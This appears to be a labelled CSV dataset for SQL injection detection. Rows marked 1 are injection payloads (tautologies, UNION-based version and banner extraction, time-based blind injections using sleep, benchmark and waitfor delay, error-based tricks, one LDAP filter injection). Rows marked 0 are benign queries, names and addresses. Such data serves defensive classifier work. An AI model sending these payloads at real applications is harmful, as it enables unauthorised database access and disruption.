Query,Label
"1 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
-7242' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'kfff' = 'kfff,1
"select * from generate_series ( 7237,7237,case when ( 7237 = 9757 ) then 1 else 0 end ) limit 1--",1
"1"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1
SELECT * FROM ( SELECT bell FROM yes ),0
"c/ paterna, s/n, 11h",0
SELECT TOP 3 * FROM volume,0
ag2u7a,0
1' where 5103 = 5103,1
1 ) as cwsi where 7360 = 7360 or sleep ( 5 ) #,1
SELECT TOP 50 PERCENT * FROM copy SELECT * FROM year FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM face,0
61882626e,0
1 ) union all select null--,1
serville9,0
1%' ) and sleep ( 5 ) and ( '%' = ',1
"de canoves 13,",0
"1"" ) ) as szxa where 1501 = 1501 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1%"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
"-8929' union all select 5324,5324,5324,5324,5324,5324--",1
terrill,0
"1 ) as skby where 4269 = 4269 or elt ( 6272 = 6272,sleep ( 5 ) ) --",1
SELECT * FROM forth WHERE Price NOT BETWEEN 10 AND 20,0
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( 'xlvt' = 'xlvt",1
"SELECT Orders.rootrID, Employees.symbol, Employees.fewer FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID = Employees.contrastID ORDER BY Orders.shallID",0
"-4397' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'omqt' = 'omqt",1
artigas girut,0
"SELECT shotID AS ID, same AS fuel FROM finger",0
SELECT TOP 3 * FROM save,0
zenaires,0
"1' ) where 5925 = 5925 union all select null,null,null,null,null,null,null#",1
ramaprak,0
"SELECT * FROM attack WHERE walk BETWEEN ""jet"" AND ""dog""",0
"1"" ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""oxvs"" like ""oxvs",1
atolera,0
"SELECT clock,bare,fruit,mile,tree ( ( bottom JOIN hurried ON planning.state = society.chair ) INNER JOIN weON Orders.bar = child.sheepID )",0
wolbert.navin@cirugiaalbeiteria.nu,0
SELECT * FROM moving ORDER BY finger DESC,0
1 ) where 6472 = 6472,1
having 1 = 1--,1
1 ) ) as smtf where 5829 = 5829,1
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""wsmz"" like ""wsmz",1
7.14471E+15,0
"1%' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( '%' = '",1
livio,0
"SELECT steady,happened,wait,mathematics,affect ( ( spent JOIN thirty ON gravity.hidden = sitting.magic ) INNER JOIN caveON Orders.all = detail.anybodyID )",0
"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( ""dqou"" like ""dqou",1
craggs,0
"1 where 6169 = 6169 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",1
"select * from users where id = 1 or ""$_"" or 1 = 1 -- 1",1
min81t8,0
"UPDATE collect SET pocket = 'particular', City = 'rest' WHERE struck = limited",0
1' ) ) and 3526 = 1354,1
paucides,0
3578,0
"1"" ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ""fvrq"" = ""fvrq",1
"1"" ) ) ) and sleep ( 5 ) and ( ( ( ""bvgg"" = ""bvgg",1
SELECT * FROM material,0
end and ( ( 6874 = 6874,1
"-8344 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- wjpa",1
"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""lgwe"" like ""lgwe",1
SELECT * FROM lady FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM taste,0
makazaga millares,0
"1"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
"SELECT again, final, never FROM disease WHERE fat IS NULL",0
34192,0
SELECT DISTINCT cake FROM stopped,0
SELECT * FROM ago WHERE noon = blank,0
SELECT * FROM Customers WHERE CustomerName LIKE '_r%';,0
SELECT * FROM arrangement WHERE design = 'sheep' FETCH FIRST 3 ROWS ONLY,0
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'yfvu' like 'yfvu,1
SELECT cook FROM lot,0
ga27393,0
1'+ ( select ophz where 9158 = 9158 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) +',1
"1 ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 6659 = 6659",1
"1' ) where 7587 = 7587 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
"SELECT excellent,funny FROM salt WHERE but = 'means' UNION SELECT muscle, percent FROM statement",0
"select * from users where id = 1 or ""_{"" or 1 = 1 -- 1",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 438 ) ORDER BY meta_id ASC",0
SELECT bank ( s ) FROM whale LEFT JOIN,0
merl,0
"select * from users where id = 1 or \.<\ union select 1,@@VERSION -- 1",1
"SELECT taken,satisfied FROM this WHERE teach = 'dear' UNION SELECT jar, step FROM scene",0
metyn,0
dobrescu_brizzard@enigmatico.so,0
dalleto poroma,0
8.60573E+15,0
"1%' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( '%' = '",1
"INSERT INTO child ( any, pony, experiment ) VALUES ( 'produce', 'difficult', 'helpful' )",0
"SELECT kill AS football, supply AS [drove] FROM saved",0
1' ) ) ) and 5615 = 5458--,1
"1' ) ) as xebq where 7959 = 7959 union all select null,null,null,null,null,null#",1
SELECT * FROM ( SELECT tight FROM leader ),0
69557398q,0
shou-che,0
SELECT * FROM pile WHERE safe = 'believed' LIMIT 3,0
SELECT * FROM hour FETCH FIRST 3 ROWS ONLY,0
"1%"" ) ) )",1
"-4558' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1
SELECT clearly ( s ) FROM somebody UNION,0
SELECT * FROM all WHERE paint BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT usually,0
asia,0
felipa,0
"quevedo y quintana s/n, 4-h",0
SELECT * FROM shelf WHERE sometime BETWEEN 10 AND 20,0
1%' and ( 2439 = 2555 ) *2555 and '%' = ',1
"1' ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( 'kbkz' = 'kbkz",1
"-7238%' or make_set ( 5375 = 9563,9563 ) and '%' = '",1
select * from users where id = 1 +$ 1 or 1 = 1 -- 1,1
229669a3a,0
SELECT * FROM bottom WHERE fully BETWEEN '1996-07-01' AND '1996-07-31',0
"-8673"" ) or make_set ( 9354 = 9354,7185 ) and ( ""edap"" like ""edap",1
buch als,0
SELECT liquid FROM battle UNION ALL SELECT football FROM becoming ORDER BY thumb,0
SELECT AVG ( Price ) FROM operation,0
"select * from users where id = '1' * ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1'",1
cecil.wolcott7@librodeapuntes.sv,0
"1' ) as wnys where 6457 = 6457 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
SELECT AVG ( third ) FROM whether,0
SELECT * FROM tribe ORDER BY hunt,0
"1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1
silas,0
"1"" ) ) as wfne where 8933 = 8933",1
-2797' ) ) ) union all select 5711#,1
"-9076'+ ( select lqvj where 8551 = 8551 union all select 8551,8551,8551,8551--",1
SELECT TOP 50 PERCENT * FROM basket SELECT * FROM record FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM youth,0
1' ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'snoa' = 'snoa,1
"-6067'+ ( select 'bfhf' where 3114 = 3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",1
"1"" ) as eaxo where 2728 = 2728",1
beasain,0
select ( case when ( 6002 = 9048 ) then 6002 else 6002* ( select 6002 from mysql.db ) end ) #,1
r3i8a83nt1,0
"1' ) as bvvl where 9818 = 9818 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1
"UPDATE money SET biggest = 'section', City = 'fair' WHERE won = model",0
"merca, a",0
SELECT * FROM quietly ORDER BY air,0
"-8331' ) union all select 1452,1452,1452,1452,1452--",1
-6014' ) ) or ( 9860 = 4848 ) *4848 and ( ( 'qtge' = 'qtge,1
"1'+ ( select pdfv where 1172 = 1172 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) +'",1
6$ng4tado,0
DELETE FROM window WHERE gas = 'tube',0
kellogg@viajesinternacionales.ne,0
-2920' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'rzey' = 'rzey,1
legris@beautifulbody.yu,0
-3520%' or 8571 = 8571--,1
admin' ) or '1' = '1,1
SELECT TOP 3 * FROM trunk WHERE great = 'mental' SELECT * FROM trick,0
SELECT * FROM judge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM troops,0
-2751 where 6334 = 6334 or ( 9668 = 5845 ) *5845--,1
"SELECT * FROM memory ORDER BY care, mathematics",0
"select * from users where id = 1 or ( 1 ) = 1 union select 1,banner from v$version where rownum = 1 -- 1",1
SELECT AVG ( Price ) FROM garage,0
%2A%28%7C%28objectclass%3D%2A%29%29,1
1 ) as dlkh where 6179 = 6179 and 9198 = 9198--,1
SELECT * FROM sell WHERE yard = 'settlers',0
"1"" ) union all select null,null,null,null,null,null,null,null,null--",1
"cuerlas, las",0
"1' or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1
42782721f,0
"SELECT surprise AS dear, rest AS [yard] FROM especially",0
SELECT * FROM enjoy WHERE studying NOT LIKE '[bell]%',0
-3895' ) or 8645 = 5359--,1
"( select 1 from generate_series ( 8515,8515,case when ( 8515 = 3477 ) then 1 else 0 end ) limit 1 )",1
SELECT TOP 3 * FROM other SELECT * FROM fort 3SELECT * FROM up,0
clodettes_pierson@repretexbcn.ml,0
"-3126 ) ) union all select 6718,6718,6718,6718,6718--",1
1 ) where 1929 = 1929 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1
1.92739E+15,0
"select * from generate_series ( 1431,1431,case when ( 1431 = 7822 ) then 1 else 0 end ) limit 1--",1
"1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
"-1631%"" ) or elt ( 8285 = 1709,1709 ) and ( ""%"" = """,1
"1' ) as kbja where 4275 = 4275 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1
81177297q,0
bascuana de san pedro,0
tebbe,0
SELECT early ( s ) FROM population UNION ALL,0
nedar,0
1' rlike ( select ( case when ( 5567 = 5586 ) then 1 else 0x28 end ) ) and 'mmnb' = 'mmnb,1
1'|| ( select 'xwbo' from dual where 1263 = 1263 waitfor delay '0:0:5' ) ||',1
"-5161%"" or ( 1437 = 4869 ) *4869 and ""%"" = """,1
"1"" ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1
valdearcos de la vega,0
UNION SELECT,1
lehmann cruanas,0
"-5275%' ) ) union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",1
"1"" ) ) ) union all select null,null,null,null,null,null,null,null,null--",1
"select * from users where id = 1 +\+. union select null,@@VERSION -- 1",1
1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'jrpk' = 'jrpk,1
longhurst-street1@drae2.pa,0
"1' and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'tqvy' like 'tqvy",1
select * from users where id = 1 &@ or 1 = 1 -- 1,1
SELECT * FROM foot FETCH FIRST 3 ROWS ONLY,0
"escultor bauls, 96,",0
4.46813E+15,0
"SELECT rocky,poetry,simple FROM negative LEFT JOIN Orders ON throat.frozenID = reason.sleep ORDER BY inch.finger",0
"1%"" ) ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"-9445 ) as dmur where 4371 = 4371 union all select 4371,4371,4371,4371,4371,4371,4371,4371,4371,4371#",1
"1'|| ( select 'ggfx' where 4932 = 4932 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) ||'",1
SELECT * FROM snow WHERE rising = 'stand' OR better = 'bear',0
SELECT * FROM neck FETCH FIRST 50 PERCENT ROWS ONLY,0
germe,0
nab,0
"select * from users where id = '1' or !<1 union select 1,version ( ) -- 1'",1
SELECT * FROM heart,0
lact1ad1,0
"1"" ) as pwvu where 8267 = 8267",1
1 and 9122 = 4153# nxcv,1
SELECT * FROM paid WHERE whispered NOT LIKE 'everything%',0
-3688'|| ( select 'pber' from dual where 7137 = 7137 order by 1#,1
"SELECT ATAN2 ( -0.8, 2 ) ;",0
"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'jhxh' = 'jhxh",1
23593437z,0
"1'+ ( select 'yzxc' where 5230 = 5230 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) ) +'",1
"SELECT * FROM well ORDER BY pile ASC, child DESC",0
-2929' ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( 'nzmk' = 'nzmk,1
SELECT AVG ( Price ) FROM hunter,0
SELECT * FROM ran WHERE element NOT LIKE '[spell]%',0
"-1668"" ) ) ) or 9323 = 9323#",1
"1' ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1
gusta mont,0
-8341 or 8571 = 8571--,1
"SELECT laid,funny,once FROM lead LEFT JOIN Orders ON ready.pitchID = tree.rise ORDER BY sure.came",0
61371247w,0
1' ) ) as uizu where 1774 = 1774,1
SELECT * FROM end 3,0
1738,0
"1"" where 5845 = 5845 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1
1'+ ( select gblp where 6768 = 6768,1
"1 ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 2939 = 2939",1
estrad sivelli,0
"1'+ ( select 'drvv' where 5622 = 5622 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"1"" ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ""llgb"" like ""llgb",1
-7231 ) ) union all select 7639#,1
gomero gallardo,0
SELECT * FROM writing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM according,0
"SELECT nearest,feathers FROM paint WHERE score = 'require' UNION SELECT liquid, young FROM together",0
1' ) as ftyp where 5851 = 5851 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,1
calle villa de andorra 36 9?b,0
-4322' ) ) as magw where 1627 = 1627 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1
user@example.com' OR '1'='1,1
"1 ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1
nrez muriscot,0
 or 3 = 3 --,1
SELECT COUNT ( DISTINCT visit ) FROM growth,0
SELECT * FROM tiny ORDER BY eat DESC,0
1'+ ( select sijr where 7250 = 7250,1
\u0027 OR 1=1,1
admin' ) or '1' = '1'#,1
"1', ( select * from generate_series ( 2636,2636,case when ( 2636 = 7071 ) then 1 else 0 end ) limit 1 )",1
"-7202%"" ) ) union all select 2901#",1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual ) ||'",1
"select * from users where id = 1 or 1#""; = 1 union select 1,version ( ) -- 1",1
hablistn,0
52310665v,0
"-6254"" where 8941 = 8941 or elt ( 1032 = 1032,3623 ) --",1
SELECT * FROM wise WHERE power = 'growth',0
SELECT shelf ( s FROM attached RIGHT JOIN,0
quisto,0
"SELECT three AS silence, pour AS [colony] FROM die",0
"1' ) where 3703 = 3703 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
1'+ ( select qtyi where 7147 = 7147,1
88341714w,0
7656,0
"1%"" ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ""%"" = """,1
SELECT AVG ( Price ) FROM wheel,0
"UPDATE direct SET classroom = 'nature', City = 'base' WHERE graph = mysterious",0
SELECT * FROM selection WHERE type BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT AVG ( captain ) FROM hurried SELECT SUM ( certain ),0
"SELECT * FROM club WHERE cabin IN ( 'chart', 'thread', 'carried' )",0
1 where 8578 = 8578 and 4770 = 4474--,1
"SELECT column1, column2, ... FROM table_name WHERE columnN LIKE pattern ;",0
igal,0
"select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'",1
select ( case when ( 8841 = 9675 ) then 8841 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1
6.51129E+15,0
SELECT * FROM feature WHERE it NOT LIKE '[our]%',0
rigente,0
1'|| ( select 'xemx' from dual where 4683 = 4683 or sleep ( 5 ) #,1
"1' or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'lxqz' = 'lxqz",1
-6405%' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( '%' = ',1
SELECT option_value FROM wp_options WHERE option_name = 'options_number_of_preferred_partners' LIMIT 1,0
besal,0
"1 ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1
"UPDATE zebra SET mighty = 'ground', City = 'worried' WHERE press = cent",0
DELETE FROM union WHERE drew = 'gravity',0
"-9688%' ) ) ) or elt ( 3695 = 7995,7995 ) and ( ( ( '%' = '",1
"select * from generate_series ( 6468,6468,case when ( 6468 = 7999 ) then 1 else 0 end ) limit 1--",1
"-5597' ) or make_set ( 2490 = 2164,2164 )",1
6320,0
"SELECT * FROM eat ORDER BY forest, alone",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 28635 ) ORDER BY meta_id ASC",0
SELECT * FROM ( SELECT service FROM series ),0
SELECT COUNT ( today ) FROM atomic,0
"1'+ ( select 'zkuf' where 3591 = 3591 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",1
prats de lluans,0
canute,0
SELECT widely ( s ) FROM lonely FULL OUTER JOIN,0
SELECT metal FROM certain UNION ALL SELECT twenty FROM seat ORDER BY probably,0
SELECT COUNT ( DISTINCT quietly ) FROM college,0
"-7860' ) ) ) union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1
SELECT * FROM repeat WHERE NOT hang = 'remove',0
1'+ ( select 'upmd' where 3438 = 3438,1
"1"" ) ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""buwe"" = ""buwe",1
"1"" where 9829 = 9829 order by 1#",1
"1%"" ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,1
"-1263"" ) or 9323 = 9323#",1
"1""",1
1 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ),1
dellinge,0
8721,0
pegler,0
-6129 ) as vuze where 1565 = 1565 or ( 8459 = 8459 ) *4906--,1
brightwe,0
"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",1
"1%' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1
"SELECT * FROM easily WHERE kind BETWEEN ""sunlight"" AND ""till""",0
select ( case when ( 9732 = 7136 ) then 9732 else 9732* ( select 9732 from information_schema.character_sets ) end ) #,1
SELECT CHAR_LENGTH ( CustomerName ) AS LengthOfName FROM Customers;,0
mamantona,0
"1' ) ) and elt ( 4249 = 4249,7259 ) and ( ( 'oucg' = 'oucg",1
